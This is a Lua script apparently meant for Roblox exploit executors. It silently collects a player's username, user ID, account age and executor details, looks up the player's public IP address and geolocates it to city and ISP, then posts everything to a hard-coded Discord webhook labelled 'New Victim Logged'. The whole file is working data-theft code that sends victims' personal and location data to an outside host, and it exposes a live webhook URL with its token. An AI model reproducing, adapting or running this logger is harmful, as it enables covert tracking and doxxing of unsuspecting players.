local _=({syn and syn.request}or{http and http.request}or{http_request}or{request}or{fluxus and fluxus.request})[1]
local a={}
a[1]=game.PlaceId
a[2]=game.JobId
a[3]=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local b=game:GetService("Players").LocalPlayer
a[4]=b.Name
a[5]=b.DisplayName
a[6]=b.UserId
a[7]=b.AccountAge
if syn then
    a[8]="Synapse X"
    a[9]=syn.get_process_id()
elseif identifyexecutor then
    a[8]=identifyexecutor()or"Unknown Executor"
else
    a[8]="Unknown"
end
a[10]="Unavailable"
local c,d=pcall(function()
    local e=_({
        Url="https://api.ipify.org",
        Method="GET",
        Timeout=5
    })
    if e and e.Body then
        return e.Body
    end
end)
if c and d then
    a[10]=d
end
if a[10]~="Unavailable" then
    local f,g=pcall(function()
        local h=_({
            Url="http://ip-api.com/json/"..a[10],
            Method="GET",
            Timeout=5
        })
        if h and h.Body then
            return game:GetService("HttpService"):JSONDecode(h.Body)
        end
    end)
    if f and g then
        a[11]=g.countryor"Unknown"
        a[12]=g.regionNameor"Unknown"
        a[13]=g.cityor"Unknown"
        a[14]=g.ispor"Unknown"
        a[15]=g.orgor"Unknown"
    end
end
a[16]=os.date("%Y-%m-%d %H:%M:%S")
local i="https://discord.com/api/webhooks/1385372538795720704/fb5bEc0vWG5SXAgADC4IIt1q2GKNH5VQEsHKloupNSVEWGiKKfnm-iAeyVFuxKpuECph"
local j={}
j[1]={["name"]="Username",["value"]=a[4],["inline"]=true}
j[2]={["name"]="Display Name",["value"]=a[5],["inline"]=true}
j[3]={["name"]="User ID",["value"]=a[6],["inline"]=true}
j[4]={["name"]="Account Age",["value"]=a[7].." days",["inline"]=true}
j[5]={["name"]="Executor",["value"]=a[8],["inline"]=true}
j[6]={["name"]="IP Address",["value"]=a[10],["inline"]=true}
j[7]={["name"]="Location",["value"]=string.format("%s, %s, %s",a[13]or"Unknown",a[12]or"Unknown",a[11]or"Unknown"),["inline"]=false}
j[8]={["name"]="ISP/ORG",["value"]=string.format("%s / %s",a[14]or"Unknown",a[15]or"Unknown"),["inline"]=false}
j[9]={["name"]="Game",["value"]=a[3],["inline"]=true}
j[10]={["name"]="Place ID",["value"]=a[1],["inline"]=true}
j[11]={["name"]="Job ID",["value"]=a[2],["inline"]=true}
j[12]={["name"]="Local Time",["value"]=a[16],["inline"]=true}
local k={
    ["content"]="@everyone **New Victim Logged**",
    ["embeds"]={{
        ["title"]="Detailed Victim Information",
        ["fields"]=j,
        ["color"]=tonumber(0xff0000),
        ["footer"]={
            ["text"]="Logger | "..os.date("%Y-%m-%d %H:%M:%S")
        }
    }}
}
local l,m=pcall(function()
    _({
        Url=i,
        Method="POST",
        Headers={
            ["Content-Type"]="application/json"
        },
        Body=game:GetService("HttpService"):JSONEncode(k)
    })
end)
if not l then
    warn("Failed to send webhook: "..tostring(m))
end
